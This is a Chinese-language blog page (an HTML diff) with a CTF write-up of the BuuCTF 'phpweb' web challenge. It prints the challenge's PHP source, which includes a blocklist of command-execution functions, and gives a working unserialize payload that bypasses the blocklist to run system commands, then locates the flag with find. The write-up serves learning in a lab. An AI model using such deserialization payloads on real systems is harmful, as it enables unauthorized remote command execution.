@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>刷BuuCTF · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-07-17">2024年7月17日</time>
+        
+        
+          <span class="post__readtime">5 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/DASCTF/">#DASCTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">刷BuuCTF</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <!--toc-->
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><img src="/../img/Typora/image-20240717150351634.png" alt="image-20240717150351634"></p>
+<p>查看html源码发现有用post传的<code>func</code>和<code>p</code></p>
+<p><img src="/../img/Typora/image-20240717150440654.png" alt="image-20240717150440654"></p>
+<p>bp随便传些数据，发现有call_user_func()函数报错</p>
+<p><img src="/../img/Typora/image-20240717150523402.png" alt="image-20240717150523402"></p>
+<p>猜测后面有用<code>call_user_func()</code>函数</p>
+<p>测试发现<code>system() popen() exec() shell_exec()  passthru() file_put_contents()</code>这些写入文件和命令执行的函数都被过滤了。</p>
+<p><code>file_get_contents()</code>没有被过滤，读出源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>到这里没什么思路了。</p>
+<p>上网瞄了一眼wp</p>
+<p>可以用反序列化进行命令执行。</p>
+<p>用反序列化传入,成功执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240717151249492.png" alt="image-20240717151249492"></p>
+<p>找了一圈没发现flag。</p>
+<p>使用<code>find / -name *flag*</code>找到些东西</p>
+<p><img src="/../img/Typora/image-20240717151521682.png" alt="image-20240717151521682"></p>
+<p>读取文件</p>
+<p><img src="/../img/Typora/image-20240717151616156.png" alt="image-20240717151616156"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/07/22/2024ciscn/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">2024ciscn“sanic”复现</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/11/CTF/DASCTF/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">刷DASCTF</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
